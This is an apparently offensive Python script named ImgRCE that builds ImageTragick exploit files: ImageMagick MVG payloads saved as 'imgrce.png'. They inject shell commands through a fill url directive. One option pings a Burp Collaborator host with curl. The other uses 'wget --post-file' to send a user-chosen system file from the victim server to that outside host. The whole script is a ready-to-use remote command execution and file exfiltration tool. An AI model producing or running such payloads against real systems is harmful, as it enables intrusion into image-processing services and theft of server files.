#!/usr/bin/env python
#!ImgRCE
#!Author: Ankit Singh

import os
from termcolor import colored

name = """

  ___ __  __  ____ ____   ____ _____ 
 |_ _|  \/  |/ ___|  _ \ / ___| ____|
  | || |\/| | |  _| |_) | |   |  _|  
  | || |  | | |_| |  _ <| |___| |___ 
 |___|_|  |_|\____|_| \_\\___ _|_____|
\tAuthor - Ankit Singh @ankitk323
\tImgRCE - Image Tragick Exploit Using Burp Collaborator

"""

print(name)

Collaborator=(raw_input("\n[*] Enter the Burp Collaborator Link> "))

command_1="""push graphic-context 
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg "|curl %s")'
pop graphic-context
"""%(Collaborator)

def check():
	with open("imgrce.png","w") as img:
		print("-"*20)
		print("Exploit Created!.. visit the Collaborator")
		print("-"*20)
		img.write(command_1)
		img.close()
		out = (raw_input("[*] You want to exit y/n> "))
		if out == "y":
			print("\nThanks")
			exit()
		elif out == "n":
			return()
		else:
			print("[*] Please enter yes or no.")
		
def system_file():
	with open("imgrce.png","w") as img:
		print("-"*20)
		print("Exploit Created!.. visit the Collaborator")
		print("-"*20)
		img.write(command_2)
		img.close()
		out = (raw_input("[*] You want to exit y/n> "))
		if out == "y":
			print("\nThanks")
			exit()
		elif out == "n":
			return()
		else:
			print("[*] Please enter yes or no.")
		

if ".burpcollaborator.net" in Collaborator:
	active = True
	while active:
		print("\n[0] for Exit")
		print("[1] for Ping")
		print("[2] for System File")
		select = int(raw_input("\n[*] Select the option> "))
		if select == 0:
			print("\nThanks")
			exit()
		elif select == 1:
			check()
		elif select == 2:
			file =(raw_input("[*] Enter the System file name> "))
			command_2="""push graphic-context 
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg "|wget --post-file %s %s")'
pop graphic-context
			"""%(file,Collaborator)
			system_file()
		else:
			print("\n>Error, Enter The Correct Number!!")
else:
	print("\n>Error, Enter Correct link!!")

